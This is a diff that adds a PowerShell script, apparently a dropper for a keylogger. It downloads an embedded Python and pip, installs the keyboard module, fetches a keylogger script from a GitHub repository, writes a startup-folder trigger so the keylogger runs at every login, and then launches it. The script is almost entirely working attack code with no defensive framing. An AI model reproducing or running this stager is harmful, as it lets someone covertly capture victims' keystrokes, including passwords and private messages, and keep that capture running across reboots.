@@ -1,4 +1,73 @@
+
+#MAIN SCRIPT
+
+#Getting the embedded zip folder with python from official website and string it on computer
+
 $source = 'https://www.python.org/ftp/python/3.11.1/python-3.11.1-embed-amd64.zip';
 $user = [System.Environment]::UserName;
 $destination = "C:\Users\$user\Downloads\test.zip";
+
 Invoke-WebRequest -Uri $source -OutFile $destination;
+
+
+#Unzipping a zip file
+
+Expand-Archive -Path $destination -DestinationPath "C:\Users\$user\Downloads\test" -Force;
+
+
+#Downloading PIP
+
+$pipdownloadurl = 'https://bootstrap.pypa.io/get-pip.py';
+
+$destination4pip = "C:\Users\$user\Downloads\get-pip.py";
+
+Invoke-WebRequest -Uri $pipdownloadurl -OutFile $destination4pip;
+
+
+C:\Users\oleg_\Downloads\test\python.exe $destination4pip
+
+
+#Getting inside the python folder
+
+cd C:\Users\$user\Downloads\test
+
+#Replacing a file that gets pip working
+
+Remove-Item python311._pth
+
+
+$sourceUrl = 'https://raw.githubusercontent.com/OlegLeo/RemoteScriptTest/main/python311._pth';
+$user = [System.Environment]::UserName;
+$destination4replacement = "C:\Users\$user\Downloads\test\python311._pth";
+
+Invoke-WebRequest -Uri $sourceUrl -OutFile $destination4replacement;
+
+
+# Installing the required modules
+
+powershell -c C:\Users\$user\Downloads\test\scripts\pip.exe install keyboard;
+powershell -c C:\Users\$user\Downloads\test\scripts\pip.exe install ssl;
+powershell -c C:\Users\$user\Downloads\test\scripts\pip.exe install email;
+
+
+# Downloading the keylogger script
+
+$sourceKeyLogger = 'https://raw.githubusercontent.com/OlegLeo/RemoteScriptTest/main/keyloggerscript.py';
+$user = [System.Environment]::UserName;
+$destination4keylogger = "C:\Users\$user\Downloads\keyloggerscript.py";
+
+Invoke-WebRequest -Uri $sourceKeyLogger -OutFile $destination4keylogger;
+
+
+
+# Creating trigger file on startup for keylogger
+
+New-Item "C:\Users\oleg_\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\trigger.txt";
+
+Set-Content "C:\Users\oleg_\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\trigger.cmd" 'powershell -c C:\Users\$user\Downloads\test\python.exe C:\Users\$user\Downloads\keyloggerscript.py
+';
+
+
+# Running keylogger script
+
+powershell -c C:\Users\$user\Downloads\test\python.exe C:\Users\$user\Downloads\keyloggerscript.py
